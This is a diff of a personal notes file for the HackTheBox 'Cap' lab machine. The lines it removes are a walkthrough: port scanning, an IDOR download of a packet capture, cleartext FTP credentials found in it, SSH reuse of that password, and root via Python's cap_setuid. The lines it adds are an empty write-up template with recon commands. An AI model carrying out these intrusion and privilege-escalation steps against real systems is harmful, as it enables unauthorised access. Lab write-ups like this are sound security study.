@@ -12,123 +12,276 @@ tags:
   - pcap
   - capabilities
   - cap_setuid
-synced: "2026-10-16 12:38"
+synced: "2026-11-02 09:58"
 ---
 
-This write-up covers the exploitation of the **Cap** machine from HackTheBox. The attack path involves identifying an Insecure Direct Object Reference (IDOR) vulnerability to download sensitive network captures, extracting cleartext credentials, and leveraging Linux capabilities for privilege escalation to gain root access.
-## Overview
+--
+tags:
+ciber
+htb
+machine
+difficulty: Easy
+os: Linux
+status: Pwned
+ip: "10.129.131.96"
+created: 2026-10-16
+--
 
-- **OS:** Linux
-- **Difficulty:** Easy
-- **IP Address:** 10.129.11.159
-## Reconnaissance
+<p align="center">
+  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90d2-73c7-4da0-a15f-662bbc048868.png" alt="Cap Avatar" width="220">
+</p>
 
-### Port Scanning
+## Operating System: Linux
+![[Linux.png|70]]
 
-We begin by scanning the target machine using Nmap to identify open ports and services:
+## Machine Metadata
 
-```bash
-nmap -sS -T5 -p- -Pn 10.129.11.159 -vvv
-nmap -sV -p21,22,80 10.129.11.159
+| Property | Value |
+| :--- | :--- |
+| **Machine ID** | 351 |
+| **Machine Name** | Cap |
+| **IP Address** | 10.129.131.96 |
+| **Status** | Pwned |
+| **Active on HTB** | ❌ |
+| **User Flag** | ✅ |
+| **Root Flag** | ✅ |
+| **Difficulty** | Easy |
+| **Stars** | ⭐️ 4.6 |
+| **Created Note** | 2026-10-16 |
+| **Release Date** | 2021-06-05 |
+| **Tags** | #Vulnerability_Assessment #Security_Operations #Clear_Text_Credentials #File_System_Configuration #Insecure_Direct_Object_Reference_(IDOR) #Python #Packet_Capture_Analysis #Password_Reuse #SUID_Exploitation #Common_Security_Controls #Log_Analysis |
+
+<p style="display:none">
+id:: 351
+active:: False
+name:: Cap
+os:: Linux
+user_flag:: True
+root_flag:: True
+difficulty_text:: Easy
+stars:: 4.6
+created:: 2026-10-16
+published:: 2021-06-05
+avatar:: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90d2-73c7-4da0-a15f-662bbc048868.png
+tags:: #Vulnerability_Assessment #Security_Operations #Clear_Text_Credentials #File_System_Configuration #Insecure_Direct_Object_Reference_(IDOR) #Python #Packet_Capture_Analysis #Password_Reuse #SUID_Exploitation #Common_Security_Controls #Log_Analysis
+</p>
+
+## Statistics
+
+### Radar Matrix
+```chartsview
+#-----------------#
+#- chart type    -#
+#-----------------#
+type: Radar
+
+#-----------------#
+#- chart data    -#
+#-----------------#
+data:
+item: "ENUM"
+    user: "user"
+    score: 4.8
+item: "REAL"
+    user: "user"
+    score: 4.2
+item: "CVE"
+    user: "user"
+    score: 4.6
+item: "CUSTOM"
+    user: "user"
+    score: 5.4
+item: "CTF"
+    user: "user"
+    score: 5.8
+item: "ENUM"
+    user: "author"
+    score: 2
+item: "REAL"
+    user: "author"
+    score: 2
+item: "CVE"
+    user: "author"
+    score: 7
+item: "CUSTOM"
+    user: "author"
+    score: 3
+item: "CTF"
+    user: "author"
+    score: 8
+
+#-----------------#
+#- chart options -#
+#-----------------#
+options:
+  xField: "item"
+  yField: "score"
+  seriesField: "user"
+  meta:
+    score:
+      alias: "Score"
+      min: 0
+      nice: true
+  xAxis:
+    line: null
+    tickLine: null
+  yAxis:
+    label: false
+    grid:
+      alternateColor: "rgba(0, 0, 0, 0.04)"
+  point: []
+  area: []
 ```
 
-The scan reveals the following open ports:
+### Community Difficulty Rating
+```chartsview
+#-----------------#
+#- chart type    -#
+#-----------------#
+type: Column
 
-| Port | Service | Version        | Status |
-|------|---------|----------------|--------|
-| 21   | FTP     | vsftpd 3.0.3   | Open   |
-| 22   | SSH     | OpenSSH 8.2p1  | Open   |
-| 80   | HTTP    | Gunicorn       | Open   |
+#-----------------#
+#- chart data    -#
+#-----------------#
+data:
+folder: "PIECE OF CAKE"
+    count: 21973
+folder: "VERY EASY"
+    count: 25061
+folder: "EASY"
+    count: 42397
+folder: "NOT TOO EASY"
+    count: 15456
+folder: "MEDIUM"
+    count: 7828
+folder: "A BIT HARD"
+    count: 1978
+folder: "HARD"
+    count: 1225
+folder: "EXTREMELY HARD"
+    count: 307
+folder: "INSANE"
+    count: 126
+folder: "BRAINFUCK"
+    count: 440
 
-The web server is running Gunicorn, a Python web server gateway interface (WSGI) HTTP server.
-
-### Web Enumeration
-
-Navigating to the web service on port 80, we find a simple dashboard with a side menu and a user profile that doesn't seem to lead anywhere. 
-
-![[Pasted image 20260601221726.png]]
-
-However, exploring the application reveals an interesting page called "Security Snapshot". This page features a "Download" button that allows us to download PCAP (Packet Capture) files. The URL structure for these snapshots is `http://10.129.11.159/data/X`, where `X` represents an ID number.
-
-![[Pasted image 20260601221952.png]]
-
-## Vulnerability Analysis (IDOR)
-
-Given the predictable URL structure, we can test for an Insecure Direct Object Reference (IDOR) vulnerability by changing the ID number. By setting the ID to `0` (`http://10.129.11.159/data/0`), we successfully download a network snapshot that doesn't belong to our session.
-
-We analyze the downloaded `0.pcap` file using the `strings` command to extract readable text:
-
-```bash
-strings 0.pcap
+#-----------------#
+#- chart options -#
+#-----------------#
+options:
+  xField: "folder"
+  yField: "count"
+  padding: auto
+  label:
+    position: "middle"
+    style:
+      opacity: 0.6
+      fontSize: 12
+  columnStyle:
+    fillOpacity: 0.5
+    lineWidth: 1
+    strokeOpacity: 0.7
+    shadowColor: "grey"
+    shadowBlur: 10
+    shadowOffsetX: 5
+    shadowOffsetY: 5
+  xAxis:
+    label:
+      autoHide: false
+      autoRotate: true
+  meta:
+    count:
+      alias: "Votes"
 ```
 
-Within the output, we uncover an FTP login sequence containing cleartext credentials:
+--
 
+--
+
+## Information Gathering
+
+### Port & Service Scanning
+```bash
+# Fast TCP port discovery
+nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.131.96 -oN recon_ports.nmap
+
+# Service & script enumeration
+nmap -sCV -p<PORTS> 10.129.131.96 -oN recon_services.nmap
+```
+
+### Web & Service Enumeration
+```bash
+# Directory & file fuzzing
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.129.131.96/FUZZ -fc 404
+```
+
+--
+
+## Vulnerability Assessment
+<!-- Analysis of attack surface, identified technologies, CVEs, misconfigurations, or logic flaws -->
+**Identified Vector**: 
+**Target Zettelkasten Concept**: Cybersecurity Hub
+**Attack Hypothesis**: 
+
+--
+
+## Exploitation (Foothold)
+
+### Weaponization & Payload Execution
+<!-- Exploit details, PoC, parameters, or reverse shell payload -->
+```bash
+
+```
+
+### User Shell & Flag
+**Initial Access User**: 
+**User Flag (`user.txt`)**:
 ```text
-220 (vsFTPd 3.0.3)
-USER nathan
-331 Please specify the password.
-PASS Buck3tH4TF0RM3!
-230 Login successful.
+
 ```
 
-We now have valid credentials: `nathan:Buck3tH4TF0RM3!`.
+--
 
-## Exploitation & Foothold
+## Post-Exploitation & Lateral Movement
 
-With these credentials, we can authenticate to the FTP service running on port 21:
-
+### Internal Enumeration & Pivoting
 ```bash
-ftp 10.129.11.159
-Connected to 10.129.11.159.
-220 (vsFTPd 3.0.3)
-Name (10.129.11.159:julicc): nathan
-331 Please specify the password.
-Password:
-230 Login successful.
+# Local reconnaissance (sudo privileges, SUIDs, listening services, cron)
+sudo -l
+find / -perm -4000 -type f 2>/dev/null
+ss -tulpn
 ```
 
-We find the `user.txt` flag and download it. Moreover, since password reuse is common, we attempt to use the same credentials to log in via SSH:
-
+### Privilege Escalation Vector
+<!-- Exploit technique used to escalate to root / NT AUTHORITY\SYSTEM -->
+**Technique**: 
+**Escalation Steps**:
 ```bash
-ssh nathan@10.129.11.159
+
 ```
 
-The login is successful, providing us with a stable interactive shell as the `nathan` user.
+### Root Shell & Flag
+**Final User**: root / SYSTEM
+**Root Flag (`root.txt` / `proof.txt`)**:
+```text
 
-## Privilege Escalation
-
-Once on the system, we start looking for privilege escalation vectors. A common check is to look for binaries with special capabilities using `getcap`:
-
-```bash
-nathan@cap:~$ getcap -r / 2>/dev/null
-/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
-/usr/bin/ping = cap_net_raw+ep
-/usr/bin/traceroute6.iputils = cap_net_raw+ep
-/usr/bin/mtr-packet = cap_net_raw+ep
-/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
 ```
 
-We discover that the `/usr/bin/python3.8` binary has the `cap_setuid` capability enabled. This capability allows the binary to arbitrarily change its User ID (UID), effectively bypassing standard permissions.
+--
 
-We can abuse this by launching Python and using the `os` module to set our UID to `0` (root), and then spawning a root shell:
+## Proof of Concept & Attack Summary
+<!-- High-level summary of the end-to-end exploit chain -->
+**Recon**: 
+**Foothold**: 
+**PrivEsc**: 
 
-```bash
-nathan@cap:~$ python3.8
-Python 3.8.5 (default, Jan 27 2021, 15:41:15)
-[GCC 9.3.0] on linux
-Type "help", "copyright", "credits" or "license" for more information.
->>> import os
->>> os.setuid(0)
->>> os.system('whoami')
-root
-0
->>> os.system('bash')
-root@cap:~#
-```
+--
 
-We successfully obtain a root shell and can now retrieve the root flag.
+## Post-Engagement & Zettelkasten Notes
 
-## Conclusion
+### Key Takeaways & Defense
+**Root Cause**: 
+**Remediation / Mitigation**: 
 
-The Cap machine provides an excellent demonstration of how a simple IDOR vulnerability can lead to credential exposure. Furthermore, it highlights the dangers of assigning excessive Linux capabilities to standard binaries like Python, which can be trivially abused to escalate privileges to root.
+### Atomic Notes to Extract
+<!-- Concepts and techniques to document in 20_Zettelkasten/ -->
